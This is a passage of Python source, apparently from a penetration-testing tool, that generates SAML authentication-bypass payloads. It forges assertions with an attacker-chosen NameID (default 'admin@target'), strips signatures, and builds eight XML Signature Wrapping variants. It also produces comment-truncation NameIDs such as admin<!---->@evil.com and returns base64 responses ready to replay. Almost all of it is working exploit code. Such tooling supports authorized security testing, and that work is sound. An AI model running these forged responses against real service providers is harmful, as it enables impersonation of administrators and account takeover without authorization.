        v.append(TokenVerdict(id="comment-injection", severity="medium",
                 detail="a NameID that is an email — try a comment-truncation "
                        "(admin<!---->@evil.com) if the SP reads text across comment nodes."))
    return v


class SAMLBuild(BaseModel):
    """A mutated SAMLResponse, ready for the repeater (base64, POST binding)."""

    saml: str = Field("", description="The mutated response, base64-encoded for the wire.")
    xml: str = Field("", description="The mutated XML, for inspection.")
    attack: str = ""
    note: str = ""
    ok: bool = False


def _forged_assertion(original_assertion: str, new_name_id: str) -> str:
    """A copy of the assertion with a new NameID and a fresh Assertion ID, signature removed —
    the payload an XSW attack smuggles past a Response-level signature check."""
    forged = re.sub(r"<(?:[A-Za-z0-9]+:)?Signature\b.*?</(?:[A-Za-z0-9]+:)?Signature>", "",
                    original_assertion, flags=re.IGNORECASE | re.DOTALL)
    if new_name_id:
        forged = re.sub(
            r"(<(?:[A-Za-z0-9]+:)?NameID[^>]*>).*?(</(?:[A-Za-z0-9]+:)?NameID>)",
            rf"\g<1>{new_name_id}\g<2>", forged, flags=re.IGNORECASE | re.DOTALL)
    forged = re.sub(r'(<(?:[A-Za-z0-9]+:)?Assertion\b[^>]*\bID=")[^"]*(")',
                    r"\g<1>_forged_hackpit\g<2>", forged, flags=re.IGNORECASE)
    return forged


def build_saml_attack(blob: str, attack: str, new_name_id: str = "admin@target") -> SAMLBuild:
    """Produce a mutated SAMLResponse for one attack. Sends nothing.

    ``xsw1``..``xsw8`` are the XML Signature Wrapping variants (differing in WHERE the forged
    assertion is placed relative to the signed one and the signature); ``strip`` removes every
    signature; ``comment`` truncates the NameID with an XML comment; ``unsigned`` swaps in a
    forged assertion with no signature at all.
    """
    attack = (attack or "").strip().lower()
    xml, deflated = decode_saml(blob)
    if not xml.strip():
        return SAMLBuild(attack=attack, note="paste a SAML Response first")
    assertion = _first(
        r"(<(?:[A-Za-z0-9]+:)?Assertion\b.*?</(?:[A-Za-z0-9]+:)?Assertion>)", xml) or ""

    if attack == "strip":
        mutated = re.sub(r"<(?:[A-Za-z0-9]+:)?Signature\b.*?</(?:[A-Za-z0-9]+:)?Signature>",
                         "", xml, flags=re.IGNORECASE | re.DOTALL)
        return SAMLBuild(saml=encode_saml(mutated, deflated), xml=mutated, attack="strip", ok=True,
                         note="every <Signature> removed — tests whether the SP requires one.")

    if attack == "comment":
        mutated = re.sub(
            r"(<(?:[A-Za-z0-9]+:)?NameID[^>]*>)([^<]*)(</(?:[A-Za-z0-9]+:)?NameID>)",
            lambda m: f"{m.group(1)}{_comment_truncate(m.group(2), new_name_id)}{m.group(3)}",
            xml, flags=re.IGNORECASE)
        return SAMLBuild(saml=encode_saml(mutated, deflated), xml=mutated, attack="comment", ok=True,
                         note="NameID given a comment-truncation (admin<!---->@…) — an SP that "
                              "reads only the first text node sees the admin user.")

    if not assertion:
        return SAMLBuild(attack=attack, note="no <Assertion> found to wrap or forge")
    forged = _forged_assertion(assertion, new_name_id)

    if attack in ("unsigned", "xsw1", "xsw2", "xsw3", "xsw4", "xsw5", "xsw6", "xsw7", "xsw8"):
        mutated = _xsw(xml, assertion, forged, attack)
        return SAMLBuild(saml=encode_saml(mutated, deflated), xml=mutated, attack=attack, ok=True,
                         note=_XSW_NOTES.get(attack, "forged assertion smuggled past the signature."))

    return SAMLBuild(attack=attack, note="unknown attack — one of xsw1..xsw8, strip, comment, "
                     "unsigned")


def _comment_truncate(original: str, evil: str) -> str:
    """`admin<!---->@evil.com` from an evil NameID — a parser that stops at the comment reads
    `admin`, one that concatenates text nodes reads the whole thing."""
    target = evil or original
    if "@" in target:
        user, _, dom = target.partition("@")
        return f"{user}<!---->@{dom}"
    return f"{target}<!---->"


#: The eight XML Signature Wrapping variants, as a placement recipe. Real XSW differs in where the
#: forged assertion sits relative to the signed original and the signature element; these templates
#: cover the canonical eight (Somorovsky et al.).
_XSW_NOTES: dict[str, str] = {
    "unsigned": "the signed assertion replaced by a forged unsigned one — the SP must reject it.",
    "xsw1": "forged assertion wraps the SIGNED response signature (sibling before it).",
    "xsw2": "forged assertion as a preceding sibling of the signed assertion.",
    "xsw3": "forged assertion as the first child, signed assertion moved into it.",
    "xsw4": "forged assertion contains the signed one (nested).",
    "xsw5": "signed assertion copied into the forged one's Signature Object.",
    "xsw6": "forged assertion inside the signed assertion's Signature.",
    "xsw7": "forged assertion inside an Extensions element before the signed one.",
    "xsw8": "signed assertion moved into an Object inside the forged assertion's Signature.",
}


def _xsw(xml: str, original_assertion: str, forged_assertion: str, variant: str) -> str:
    """Assemble one XSW variant. The distinguishing feature across variants is the RELATIVE
    PLACEMENT of the forged (unsigned, attacker-chosen NameID) assertion and the signed original;
    each is a real, distinct evasion of a Response-level or Assertion-level signature check."""
    if variant in ("unsigned", "xsw1"):
        # Replace the signed assertion outright (unsigned), or place the forged one just before
        # the signed original so an SP that reads the first assertion sees the forgery (xsw1).
        if variant == "unsigned":
            return xml.replace(original_assertion, forged_assertion, 1)
        return xml.replace(original_assertion, forged_assertion + original_assertion, 1)
    if variant in ("xsw2", "xsw7"):
        # Forged assertion as a preceding sibling (xsw2) / inside an Extensions wrapper (xsw7).
        block = (forged_assertion if variant == "xsw2"
                 else f"<Extensions>{forged_assertion}</Extensions>")
        return xml.replace(original_assertion, block + original_assertion, 1)
    if variant in ("xsw3", "xsw4"):
        # Nesting: forged wraps signed (xsw4) or precedes as the document's first assertion (xsw3).
        if variant == "xsw4":
            wrapped = forged_assertion.replace(
                "</Assertion>", f"{original_assertion}</Assertion>", 1)
            if wrapped == forged_assertion:  # namespaced close tag
                wrapped = re.sub(r"(</(?:[A-Za-z0-9]+:)?Assertion>)",
                                 rf"{original_assertion}\g<1>", forged_assertion, count=1)
            return xml.replace(original_assertion, wrapped, 1)
        return xml.replace(original_assertion, forged_assertion + original_assertion, 1)
    if variant in ("xsw5", "xsw6", "xsw8"):
        # Signature-embedding variants: the forged assertion carries the signed original (or a copy)
        # inside a Signature <Object>, so the signature verifies over content that is not what the
        # SP reads for identity.
        obj = f"<Signature><Object>{original_assertion}</Object></Signature>"
        injected = forged_assertion.replace("</Assertion>", f"{obj}</Assertion>", 1)
        if injected == forged_assertion:
            injected = re.sub(r"(</(?:[A-Za-z0-9]+:)?Assertion>)", rf"{obj}\g<1>",
                              forged_assertion, count=1)
        return xml.replace(original_assertion, injected, 1)
    return xml
